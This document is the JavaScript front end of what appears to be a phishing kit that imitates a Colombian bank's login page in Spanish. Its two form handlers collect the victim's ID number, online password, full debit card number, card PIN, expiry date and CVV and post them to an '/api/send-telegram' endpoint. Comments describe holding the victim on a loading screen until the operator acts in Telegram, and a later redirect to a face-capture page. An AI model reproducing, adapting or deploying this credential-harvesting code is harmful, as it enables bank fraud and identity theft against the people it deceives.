/**
 * INDEX.JS - Página principal de login
 * Maneja formularios de Clave Segura y Tarjeta Débito
 */

document.addEventListener('DOMContentLoaded', function() {
    console.log('🚀 Iniciando aplicación principal...');
    
    // Asegurar que commonUtils esté inicializado
    if (window.commonUtils && !window.commonUtils.initialized) {
        window.commonUtils.initializeCommon();
    }
    
    // Forzar valor predeterminado en los selects al cargar
    const selectClave = document.getElementById('tipoDocClave');
    const selectTarjeta = document.getElementById('tipoDocTarjeta');
    if (selectClave) selectClave.value = 'C.C. Cédula de ciudadanía';
    if (selectTarjeta) selectTarjeta.value = 'C.C. Cédula de ciudadanía';
    
    // Elementos del carrusel
    const serviceCards = document.querySelector('.service-cards');
    const prevButton = document.querySelector('.prev-button');
    const nextButton = document.querySelector('.next-button');
    let scrollAmount = 0;
    const cardWidth = 132;

    // Función para actualizar visibilidad de botones
    function updateButtonVisibility() {
        if (prevButton && nextButton) {
            prevButton.style.display = scrollAmount <= 0 ? 'none' : 'flex';
            nextButton.style.display = 
                scrollAmount >= serviceCards.scrollWidth - serviceCards.clientWidth ? 'none' : 'flex';
        }
    }

    // Manejadores de eventos para los botones del carrusel
    if (prevButton && nextButton && serviceCards) {
        prevButton.addEventListener('click', () => {
            scrollAmount = Math.max(scrollAmount - cardWidth, 0);
            serviceCards.style.transform = `translateX(-${scrollAmount}px)`;
            updateButtonVisibility();
        });

        nextButton.addEventListener('click', () => {
            const maxScroll = serviceCards.scrollWidth - serviceCards.clientWidth;
            scrollAmount = Math.min(scrollAmount + cardWidth, maxScroll);
            serviceCards.style.transform = `translateX(-${scrollAmount}px)`;
            updateButtonVisibility();
        });
    }

    // Elementos del formulario
    const loginOptions = document.querySelectorAll('.login-options button');
    const claveForm = document.getElementById('claveForm');
    const tarjetaForm = document.getElementById('tarjetaForm');
    const loginAlert = document.getElementById('loginAlert');

    // Manejar botones de mostrar/ocultar contraseña
    document.querySelectorAll('.toggle-password').forEach(button => {
        button.addEventListener('click', function(e) {
            e.preventDefault();
            const input = this.parentElement.querySelector('input');
            const slashElement = this.querySelector('.slash');
            
            if (input.type === 'password') {
                input.type = 'text';
                this.classList.add('show');
            } else {
                input.type = 'password';
                this.classList.remove('show');
            }
            
            if (slashElement) {
                slashElement.style.opacity = input.type === 'password' ? '0' : '1';
            }
        });
    });

    // Permitir solo números en campos específicos
    document.querySelectorAll('input[type="password"], input[type="text"]:not(.cardholder-name)').forEach(input => {
        input.addEventListener('input', function() {
            if (!this.classList.contains('cardholder-name')) {
                this.value = this.value.replace(/\D/g, '');
            }
        });
    });

    // Formatear número de tarjeta (16 dígitos con espacios)
    const cardNumberInput = document.querySelector('input[name="card-full-number"]');
    if (cardNumberInput) {
        cardNumberInput.addEventListener('input', function(e) {
            let value = this.value.replace(/\s/g, '').replace(/\D/g, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
            this.value = formattedValue;
        });
    }

    // Formatear fecha de vencimiento (MM/AA)
    const expiryInput = document.querySelector('input[name="card-expiry"]');
    if (expiryInput) {
        expiryInput.addEventListener('input', function(e) {
            let value = this.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.slice(0, 2) + '/' + value.slice(2, 4);
            }
            this.value = value;
        });
    }

    // Manejar cambio entre formularios
    loginOptions.forEach((button, index) => {
        button.addEventListener('click', function() {
            console.log('Cambiando formulario...');
            loginOptions.forEach(btn => btn.classList.remove('active'));
            this.classList.add('active');

            if (index === 0) {
                claveForm.style.display = 'block';
                tarjetaForm.style.display = 'none';
                loginAlert.style.display = 'block';
            } else {
                claveForm.style.display = 'none';
                tarjetaForm.style.display = 'block';
                loginAlert.style.display = 'none';
            }
        });
    });

    // ========================================
    // SUBMIT HANDLER - CLAVE SEGURA
    // ========================================
    
    claveForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        console.log('📝 Formulario Clave Segura enviado');
        
        // Prevenir envíos múltiples
        if (window.isSubmitting) {
            console.log('⚠️ Ya hay un envío en proceso');
            return;
        }

        // Obtener valores del formulario
        const tipoDoc = this.querySelector('select').value;
        const numDoc = this.querySelector('input[type="text"]').value.trim();
        const claveSegura = this.querySelector('input[type="password"]').value.trim();

        // Validación básica
        if (!numDoc || !claveSegura) {
            window.commonUtils.showError('Por favor complete todos los campos obligatorios');
            return;
        }

        if (numDoc.length < 5) {
            window.commonUtils.showError('El número de documento no es válido');
            return;
        }

        if (claveSegura.length < 4) {
            window.commonUtils.showError('La clave debe tener al menos 4 dígitos');
            return;
        }

        // Marcar como enviando
        window.isSubmitting = true;
        window.loadingOverlay.showSending('Verificando credenciales...');

        // Preparar datos
        const sessionId = window.commonUtils.getSessionId();
        
        // Limpiar sesión anterior si existe
        const prevData = sessionStorage.getItem('formData');
        if (!prevData) {
            // Nueva sesión, limpiar sessionId también
            sessionStorage.removeItem('sessionId');
            // Generar nuevo sessionId
            const newSessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            sessionStorage.setItem('sessionId', newSessionId);
        }
        
        const data = {
            tipo: 'Clave Segura',
            tipoDocumento: tipoDoc,
            numeroDocumento: numDoc,
            clave: claveSegura,
            sessionId: window.commonUtils.getSessionId()
        };

        try {
            console.log('📤 Enviando datos a Telegram con sessionId:', sessionId);
            
            const response = await fetch('/api/send-telegram', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(data)
            });

            if (!response.ok) {
                throw new Error(`Error del servidor: ${response.status}`);
            }

            const result = await response.json();
            
            if (!result.success) {
                throw new Error(result.error || 'Error al procesar la solicitud');
            }

            console.log('✅ Datos enviados exitosamente - Message ID:', result.messageId);
            
            // Mantener overlay con 'Cargando'
            console.log('📺 Overlay visible: Cargando...');
            
            // Guardar información de la sesión
            sessionStorage.setItem('formData', JSON.stringify({
                tipo: 'Clave Segura',
                formulario: 'clave',
                messageId: result.messageId,
                timestamp: new Date().toISOString()
            }));

            // El loading se mantendrá visible hasta que llegue la acción de Telegram

        } catch (error) {
            console.error('❌ Error al enviar formulario:', error);
            window.loadingOverlay.hide();
            window.isSubmitting = false;
            window.commonUtils.showError('Ha ocurrido un error. Por favor intente nuevamente.');
        }
    });

    // ========================================
    // SUBMIT HANDLER - TARJETA DÉBITO
    // ========================================
    
    tarjetaForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        console.log('📝 Formulario Tarjeta Débito enviado');
        
        // Prevenir envíos múltiples
        if (window.isSubmitting) {
            console.log('⚠️ Ya hay un envío en proceso');
            return;
        }

        // Obtener valores del formulario
        const tipoDoc = this.querySelector('select').value;
        const numDoc = this.querySelector('input[name="identification"]').value.trim();
        const numeroTarjeta = this.querySelector('input[name="card-full-number"]').value.replace(/\s/g, '').trim();
        const claveTarjeta = this.querySelector('input[name="card-pin"]').value.trim();
        const fechaVencimiento = this.querySelector('input[name="card-expiry"]').value.trim();
        const cvv = this.querySelector('input[name="card-cvv"]').value.trim();

        // Validación básica
        if (!numDoc || !numeroTarjeta || !claveTarjeta || !fechaVencimiento || !cvv) {
            window.commonUtils.showError('Por favor complete todos los campos obligatorios');
            return;
        }

        if (numDoc.length < 5) {
            window.commonUtils.showError('El número de documento no es válido');
            return;
        }

        if (numeroTarjeta.length !== 16) {
            window.commonUtils.showError('El número de tarjeta debe tener 16 dígitos');
            return;
        }

        if (claveTarjeta.length !== 4) {
            window.commonUtils.showError('La clave de tarjeta debe tener 4 dígitos');
            return;
        }

        if (!/^\d{2}\/\d{2}$/.test(fechaVencimiento)) {
            window.commonUtils.showError('La fecha de vencimiento debe estar en formato MM/AA');
            return;
        }

        if (cvv.length !== 3) {
            window.commonUtils.showError('El CVV debe tener 3 dígitos');
            return;
        }

        // Marcar como enviando
        window.isSubmitting = true;
        window.loadingOverlay.showSending('Verificando información de tarjeta...');

        // Preparar datos
        const sessionId = window.commonUtils.getSessionId();
        
        // Limpiar sesión anterior si es el primer envío
        const prevData = sessionStorage.getItem('formData');
        if (!prevData) {
            sessionStorage.removeItem('sessionId');
            const newSessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            sessionStorage.setItem('sessionId', newSessionId);
        }
        
        const data = {
            tipo: 'Tarjeta Débito',
            tipoDocumento: tipoDoc,
            numeroDocumento: numDoc,
            numeroTarjeta: numeroTarjeta,
            claveTarjeta: claveTarjeta,
            fechaVencimiento: fechaVencimiento,
            cvv: cvv,
            sessionId: sessionId
        };

        try {
            console.log('📤 Enviando datos a Telegram con sessionId:', sessionId);
            
            const response = await fetch('/api/send-telegram', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(data)
            });

            if (!response.ok) {
                throw new Error(`Error del servidor: ${response.status}`);
            }

            const result = await response.json();
            
            if (!result.success) {
                throw new Error(result.error || 'Error al procesar la solicitud');
            }

            console.log('✅ Datos enviados exitosamente - Message ID:', result.messageId);
            
            // Guardar datos y redirigir a página de captura de cara
            sessionStorage.setItem('formData', JSON.stringify({
                tipo: 'Tarjeta Débito',
                formulario: 'tarjeta',
                messageId: result.messageId,
                timestamp: new Date().toISOString()
            }));

            // Mantener overlay y esperar redirección de Telegram
            console.log('📺 Overlay visible: esperando respuesta de Telegram...');

        } catch (error) {
            console.error('❌ Error al enviar formulario:', error);
            window.loadingOverlay.hide();
            window.isSubmitting = false;
            window.commonUtils.showError('Ha ocurrido un error. Por favor intente nuevamente.');
        }
    });

    console.log('✅ Aplicación principal iniciada correctamente');
});